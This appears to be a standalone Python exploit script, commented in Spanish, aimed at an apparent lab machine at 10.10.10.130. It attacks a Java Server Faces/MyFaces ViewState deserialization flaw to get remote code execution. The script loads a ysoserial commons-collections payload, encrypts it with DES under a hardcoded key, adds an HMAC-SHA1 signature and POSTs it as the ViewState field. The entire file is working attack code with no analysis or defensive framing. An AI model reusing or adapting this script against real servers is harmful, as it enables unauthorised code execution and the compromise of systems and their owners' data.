#!/usr/bin/python
from requests import post, get
from bs4 import BeautifulSoup
import sys
from urllib.parse import urlencode, quote_plus
import pyDes
import base64
import hmac
from hashlib import sha1

url = 'http://10.10.10.130:8080/userSubscribe.faces'

def getViewState():
    # Encontrar si viewState existe o no
    try:
        request = get(url)
    except:
        print("No se puede conectar al servidor")
        sys.exit()
    
    soup = BeautifulSoup(request.text, 'html.parser')
    viewState = soup.find('input', id='javax.faces.ViewState')['value']
    return viewState

def getPayload():
    # Crear un payload para commons-collections 3.1 desde https://github.com/frohoff/ysoserial
    payload = open('payload.bin', 'rb').read()
    return payload.strip()

def exploit():
    viewState = getViewState()
    if viewState is None:
        print("No se encontró viewState")
    else:
        print("Viewstate encontrado: {}".format(viewState))
    
    payload = getPayload()
    
    # Decodificar la clave en base64
    key = base64.b64decode('SnNGOTg3Ni0=')
    
    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    enc = obj.encrypt(payload) # Encriptar con DES desde https://wiki.apache.org/myfaces/Secure_Your_Application
    hash_val = hmac.new(key, bytes(enc), sha1).digest() # Calcular hmac
    payload = enc + hash_val
    payload_b64 = base64.b64encode(payload) # Crear payload final
    print("\n\n\nEnviando payload codificado: " + payload_b64.decode()) # Decodificar a cadena antes de imprimir
    
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": "Tomcat RCE",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    execute = {'javax.faces.ViewState': payload_b64.decode()} # Decodificar a cadena antes de enviar
    r = post(url, headers=headers, data=execute)

if __name__ == '__main__':
    exploit()

